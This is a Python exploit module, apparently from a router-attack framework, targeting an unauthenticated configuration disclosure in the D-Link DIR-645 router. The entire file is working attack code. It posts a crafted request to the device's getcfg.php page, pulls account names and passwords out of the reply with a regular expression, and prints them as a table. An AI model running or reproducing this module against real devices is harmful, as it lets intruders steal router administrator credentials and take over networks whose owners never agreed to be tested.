#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import re

import prettytable

import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DIR-645 Config Disclosure',
        'description': 'D-Link DIR-645 configure information allow unauthenticated access',
        'reference': ['https://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt'],
    }

    prompt = 'dir_645_getcfg_config'

    def __init__(self):
        super().__init__()
        self.info = None

    def run(self, host, port, timeout):
        if self.check(host, port, timeout):
            t = prettytable.PrettyTable()
            t.field_names = ['Username', 'Password']
            for c in self.info:
                t.add_row([c[0], c[1]])
            utils.print_info(t)

    def check(self, host, port, timeout):
        # address and parameters
        url = "http://{}:{}/getcfg.php".format(host, port)
        data = {"SERVICES": "DEVICE.ACCOUNT"}

        response, err = self.http_post(self.s, url, timeout, data)
        if err:
            self.print_requests_err(host, port, err)
            self.print_check_result(False, host)
            return False
        else:
            # extracting credentials
            regular = "<name>(.+?)</name><usrid>(|.+?)</usrid><password>(|.+?)</password>"
            creds = re.findall(regular, re.sub('\s+', '', response.text))

            if len(creds):
                self.info = tuple(tuple([item[0], item[2]]) for item in creds)
                self.print_check_result(True, host)
                return True  # target is vulnerable
            self.print_check_result(False, host)
            return False  # target is not vulnerable
